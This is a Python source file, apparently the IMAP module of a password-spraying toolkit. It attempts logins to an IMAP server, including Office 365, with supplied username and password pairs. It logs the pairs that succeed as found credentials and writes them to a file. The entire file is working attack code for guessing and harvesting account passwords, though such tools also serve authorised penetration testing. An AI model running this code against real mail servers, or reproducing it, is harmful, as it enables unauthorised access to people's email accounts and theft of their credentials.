import logging
from sprayingtoolkit.core.utils.messages import print_good, print_bad
import imapclient

class IMAP:
    def __init__(self, target, port):
        self.log = logging.getLogger('imapsprayer')
        self.valid_accounts = set()
        self.target = target
        self.port = port
        self.O365 = True

    def shutdown(self):
        with open('imap_valid_accounts.txt', 'a+') as account_file:
            for pair in self.valid_accounts:
                account_file.write(':'.join(pair) + '\n')

        self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to imap_valid_accounts.txt"))

    def auth_O365(self, username, password):
        log = logging.getLogger(f"auth_imap_O365({username})")
        try:
            server = imapclient.IMAPClient(self.target, port=self.port, ssl=True, timeout=3)
            server.login(username, password)
            self.valid_accounts.add((username, password))
            log.info(print_good(f"Found credentials: {username}:{password}"))
        except imapclient.exceptions.LoginError:
            log.info(print_bad(f"Authentication failed: {username}:{password} (Login failed)"))
        except Exception as e:
            self.log.error(print_bad(f"Error communicating with the IMAP server"))
            self.log.error(f"    Full error: {e}\n")

    def __str__(self):
        return "IMAP"
